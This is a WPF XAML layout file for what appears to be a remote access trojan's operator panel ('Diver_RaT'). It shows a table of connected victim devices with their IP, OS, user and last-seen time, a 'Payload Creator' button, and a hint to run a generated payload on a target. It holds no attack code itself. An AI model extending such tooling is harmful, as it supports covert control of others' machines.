<UserControl x:Class="Diver_RaT.DeviceTabContent"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>

        <!-- Toolbar -->
        <Border Grid.Row="0" Background="{StaticResource PanelGlassBrush}"
                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="0,0,0,1"
                Padding="16,10">
            <StackPanel Orientation="Horizontal">
                <Button x:Name="RefreshButton" Content="&#x21bb;  Refresh" Click="RefreshButton_Click"
                        Height="30" Padding="14,0" Margin="0,0,8,0"/>
                <Button x:Name="PayloadButton" Content="&#x26a1;  Payload Creator" Click="PayloadButton_Click"
                        Height="30" Padding="14,0" Margin="0,0,12,0"/>
                <Border Background="#1F141C12" CornerRadius="6" Padding="12,6" Margin="0,0,8,0"
                        BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1"
                        VerticalAlignment="Center">
                    <StackPanel Orientation="Horizontal">
                        <Ellipse Width="8" Height="8" Fill="{StaticResource LimeBrush}" Margin="0,0,6,0" VerticalAlignment="Center"/>
                        <TextBlock x:Name="OnlineCountText" Text="0 Online" FontSize="12" Foreground="#D6FF7A" VerticalAlignment="Center"/>
                    </StackPanel>
                </Border>
                <Border Background="#1F141C12" CornerRadius="6" Padding="12,6"
                        BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1"
                        VerticalAlignment="Center">
                    <TextBlock x:Name="TotalCountText" Text="0 Devices" FontSize="12" Foreground="#D6FF7A"/>
                </Border>
            </StackPanel>
        </Border>

        <!-- Device table -->
        <Border Grid.Row="1" Background="{StaticResource PanelGlassBrush}" Margin="16,16,16,10"
                CornerRadius="10" BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="1">
            <Grid>
                <DataGrid x:Name="DeviceGrid" Margin="0"
                          RowStyle="{StaticResource GlassRowStyle}" RowHeight="46"
                          AutoGenerateColumns="False" IsReadOnly="True"
                          SelectionMode="Single" SelectionUnit="FullRow"
                          GridLinesVisibility="Horizontal" HeadersVisibility="Column"
                          ContextMenuOpening="DeviceGrid_ContextMenuOpening">
                    <DataGrid.Columns>
                        <DataGridTemplateColumn Header="" Width="56">
                            <DataGridTemplateColumn.CellTemplate>
                                <DataTemplate>
                                    <TextBlock FontFamily="Segoe UI Emoji" FontSize="17"
                                               HorizontalAlignment="Center" VerticalAlignment="Center">
                                        <TextBlock.Style>
                                            <Style TargetType="TextBlock">
                                                <Setter Property="Text" Value="&#x1f4bb;"/>
                                                <Style.Triggers>
                                                    <DataTrigger Binding="{Binding DeviceType}" Value="Server">
                                                        <Setter Property="Text" Value="&#x1f5c4;&#xfe0f;"/>
                                                    </DataTrigger>
                                                    <DataTrigger Binding="{Binding DeviceType}" Value="Android">
                                                        <Setter Property="Text" Value="&#x1f4f1;"/>
                                                    </DataTrigger>
                                                    <DataTrigger Binding="{Binding DeviceType}" Value="Linux">
                                                        <Setter Property="Text" Value="&#x1f427;"/>
                                                    </DataTrigger>
                                                    <DataTrigger Binding="{Binding IsOnline}" Value="False">
                                                        <Setter Property="Opacity" Value="0.35"/>
                                                    </DataTrigger>
                                                </Style.Triggers>
                                            </Style>
                                        </TextBlock.Style>
                                    </TextBlock>
                                </DataTemplate>
                            </DataGridTemplateColumn.CellTemplate>
                        </DataGridTemplateColumn>

                        <DataGridTemplateColumn Header="Status" Width="64">
                            <DataGridTemplateColumn.CellTemplate>
                                <DataTemplate>
                                    <Ellipse Width="10" Height="10" HorizontalAlignment="Center" VerticalAlignment="Center">
                                        <Ellipse.Style>
                                            <Style TargetType="Ellipse">
                                                <Setter Property="Fill" Value="{StaticResource OfflineBrush}"/>
                                                <Style.Triggers>
                                                    <DataTrigger Binding="{Binding IsOnline}" Value="True">
                                                        <Setter Property="Fill" Value="{StaticResource LimeBrush}"/>
                                                    </DataTrigger>
                                                </Style.Triggers>
                                            </Style>
                                        </Ellipse.Style>
                                    </Ellipse>
                                </DataTemplate>
                            </DataGridTemplateColumn.CellTemplate>
                        </DataGridTemplateColumn>

                        <DataGridTextColumn Header="Device Name" Binding="{Binding ComputerName}" Width="*">
                            <DataGridTextColumn.ElementStyle>
                                <Style TargetType="TextBlock" BasedOn="{StaticResource CellTextStyle}">
                                    <Setter Property="FontWeight" Value="SemiBold"/>
                                </Style>
                            </DataGridTextColumn.ElementStyle>
                        </DataGridTextColumn>
                        <DataGridTextColumn Header="IP Address" Binding="{Binding IpAddress}" Width="*">
                            <DataGridTextColumn.ElementStyle>
                                <Style TargetType="TextBlock" BasedOn="{StaticResource CellTextStyle}"/>
                            </DataGridTextColumn.ElementStyle>
                        </DataGridTextColumn>
                        <DataGridTextColumn Header="OS" Binding="{Binding OS}" Width="*">
                            <DataGridTextColumn.ElementStyle>
                                <Style TargetType="TextBlock" BasedOn="{StaticResource CellTextStyle}"/>
                            </DataGridTextColumn.ElementStyle>
                        </DataGridTextColumn>
                        <DataGridTextColumn Header="User" Binding="{Binding Username}" Width="*">
                            <DataGridTextColumn.ElementStyle>
                                <Style TargetType="TextBlock" BasedOn="{StaticResource CellTextStyle}"/>
                            </DataGridTextColumn.ElementStyle>
                        </DataGridTextColumn>
                        <DataGridTextColumn Header="Last Seen" Binding="{Binding LastSeen}" Width="150">
                            <DataGridTextColumn.ElementStyle>
                                <Style TargetType="TextBlock" BasedOn="{StaticResource CellTextStyle}"/>
                            </DataGridTextColumn.ElementStyle>
                        </DataGridTextColumn>
                    </DataGrid.Columns>
                </DataGrid>

                <StackPanel x:Name="EmptyState" VerticalAlignment="Center" HorizontalAlignment="Center" Visibility="Visible">
                    <TextBlock x:Name="EmptyIcon" Text="&#x1f5a5;" FontSize="40" HorizontalAlignment="Center" Foreground="{StaticResource MutedBrush}"/>
                    <TextBlock x:Name="EmptyTitle" Text="No devices connected" FontSize="18" FontWeight="SemiBold"
                               Foreground="#D6FF7A" Margin="0,10,0,4" HorizontalAlignment="Center"/>
                    <TextBlock x:Name="EmptyHint" Text="Generate a payload with the Payload Creator and run it on a target&#x2014;it will appear here automatically"
                               FontSize="13" Foreground="{StaticResource MutedBrush}" HorizontalAlignment="Center"/>
                </StackPanel>
            </Grid>
        </Border>
    </Grid>
</UserControl>